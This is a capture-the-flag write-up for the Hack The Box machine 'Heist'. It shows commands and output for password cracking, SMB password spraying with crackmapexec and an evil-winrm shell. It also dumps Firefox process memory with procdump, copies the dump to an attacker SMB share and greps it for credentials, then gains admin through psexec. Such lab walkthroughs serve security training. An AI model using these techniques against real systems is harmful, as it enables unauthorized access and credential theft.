# Heist

Lets Jump in

nmap shows us the usual windows ports

```text
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

lets do a simple ffuf,

`ffuf -u http://10.10.10.149/FUZZ -e .php,.txt -w /usr/share/wordlists/dirb/common.txt`

not much here ^^

`http://10.10.10.149/attachments/config.txt` from guest login on the site,

we have an md5crypt password and two other cisco passwords \(crackable online with some google fu\), and we can use john to crack the md5 one using

`john --wordlist=/usr/share/wordlists/rockyou.txt hash`

we have a bunch of users that we pulled from the site

```text
admin
administrator
rout3r
guest
```

running this gives us some lead

```text
cme smb 10.10.10.149 -u users -p pass                                                                              
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent
```

with that credentials at hand, we can run some enum on the machine now, lets get the other users on the computer

```text
__$ lookupsid.py supportdesk/hazard:stealth1agent@10.10.10.149                                                                                                                                                                               
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation                                                                                                                                                                                     
                                                                                                                                                                                                                                             
[*] Brute forcing SIDs at 10.10.10.149                                                                                                                                                                                                       
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]                                                                                                                                                                                        
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112                                                                                                                                                                                 
500: SUPPORTDESK\Administrator (SidTypeUser)                                                                                                                                                                                                 
501: SUPPORTDESK\Guest (SidTypeUser)                                                                                                                                                                                                         
503: SUPPORTDESK\DefaultAccount (SidTypeUser)                                                                                                                                                                                                
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)                                                                                                                                                                                            
513: SUPPORTDESK\None (SidTypeGroup)                                                                                                                                                                                                         
1008: SUPPORTDESK\Hazard (SidTypeUser)                                                                                                                                                                                                       
1009: SUPPORTDESK\support (SidTypeUser)                                                                                                                                                                                                      
1012: SUPPORTDESK\Chase (SidTypeUser)                                                                                                                                                                                                        
1013: SUPPORTDESK\Jason (SidTypeUser)
```

add

to users file

so, now lets add these users in the users file and run again,

```text
__$ cme smb 10.10.10.149 -u users -p pass                                                                                                                                                                                                    
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)                                                                                   
---                                                                                                                             
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\support:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE     
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\chase:stealth1agent STATUS_LOGON_FAILURE          
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\chase:$uperP@ssword STATUS_LOGON_FAILURE                                                                                                                                 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\chase:Q4)sJu\Y8qz*A3?d <= here
```

we can now simply evil-winrm as this guy now, lets try that

```text
evil-winrm -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d'                                                                                                                                                                                
                                                                                                                                                                                                                                             
Evil-WinRM shell v2.4                                                                                                                                                                                                                        
                                                                                                                                                                                                                                             
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Chase\Documents> cd ../desktop                                                                                                                                                                                      
*Evil-WinRM* PS C:\Users\Chase\desktop> ls                                                                                                                                                                                                   
                                                                                                                                                                                                                                             
                                                                                                                      
    Directory: C:\Users\Chase\desktop                                                                                                                                                                                                        
                                                                                                                                                                                                                                             
                                                                                                                      
Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                                                                                                                                        
-a----        4/22/2019   9:08 AM            121 todo.txt                                                                                                                                                                                    
-a----        4/22/2019   9:07 AM             32 user.txt
```

we got user, I didn't find much after that by running winpeas, so these kind of todo.txt files will always drop you some hints, so in our case, the user might be using firefox to check the issues list on the website, so we might probably has some creds on the site

so, lets do a get-process -name firefox and get the process id

```text
*Evil-WinRM* PS C:\Users\Chase\Documents> get-process -name firefox                                                   
                                                                                                                                                                                                                                             
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                 
-------  ------    -----      -----     ------     --  -- -----------                                                 
    355      25    16420     246560       0.17   5996   1 firefox                                                                                                                                                                            
    378      28    22204      59100       0.78   6412   1 firefox                                                     
   1073      70   145564     221776       8.80   6724   1 firefox                                                     
    347      19     9796      92684       0.73   6836   1 firefox                                                     
    401      34    31916      92328       2.38   7012   1 firefo
```

now, lets dump the process data from memory using procdump \(sysinternals tool\)

```text
.\procdump64.exe -accepteula -ma 5996                                                                                                                                                              
                                                                                                                                                                                                                                             
ProcDump v10.0 - Sysinternals process dump utility                                                                                                                                                                                           
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards                                                          
Sysinternals - www.sysinternals.com                                                                                                                                                                                                          
                                                                                                                                                                                                                                             
[12:48:39] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_210729_124839.dmp                                                                                                                                                          
[12:48:39] Dump 1 writing: Estimated dump file size is 298 MB.                                                                                                                                                                               
[12:48:39] Dump 1 complete: 298 MB written in 0.6 seconds                                                                                                                                                                                    
[12:48:40] Dump count reached.                                                                                                                                                                                                               

*Evil-WinRM* PS C:\Users\Chase\Documents> ls
```

now lets get that copied over to our machine so that we can do some strings and grep foo

```text
on kali,

smbserver.py -u guest -password guest -smb2support kalishare $(pwd)

on heist.htb,

*Evil-WinRM* PS C:\Users\chase\documents> net use x: \\10.10.14.77\kalishare /user:guest guest
The command completed successfully.

*Evil-WinRM* PS C:\Users\chase\documents> cmd /c "copy firefox.exe_210729_124839.dmp X:\"                              

        1 file(s) copied.
```

strings firefox.exe\_210729\_124839.dmp \| grep -i password &gt; ffpass

on the very first line of this new file, we have a new password, now lets copy that into our pass file, and run the cme again :D

so, whenever I find new user or new password, we should usually run it agains smbmap / smbclient or crackmapexec \(cme\), so basically check if the new user has any access on the shares

```text
cme smb 10.10.10.149 -u users -p pass --shares --continue-on-success                                                                                                                                                                     
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)                                                                                   
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE                                                                                                                                 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE                                                                                                                                 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE                                                                                                                              
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:4dD!5}x/re8]FBuZ STATUS_LOGON_FAILURE                                                                                                                              
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\administrator:stealth1agent STATUS_LOGON_FAILURE                                                                                                                         
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\administrator:$uperP@ssword STATUS_LOGON_FAILURE                                                                                                                         
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\administrator:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE                                                                                                                      
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\administrator:4dD!5}x/re8]FBuZ (Pwn3d!)                                                                                                                                  
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 

```

and smbmap shows us that this guy has WRITE access on the C$ and ADMIN$ shares,

```text
smbmap -H 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'
[+] IP: 10.10.10.149:445        Name: heist.htb                                          
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    READ ONLY       Remote IPC
```

and we know what that means, run psexec and just give it the new password

`psexec.py heist.htb/administrator@10.10.10.149`

we have admin now on the machine

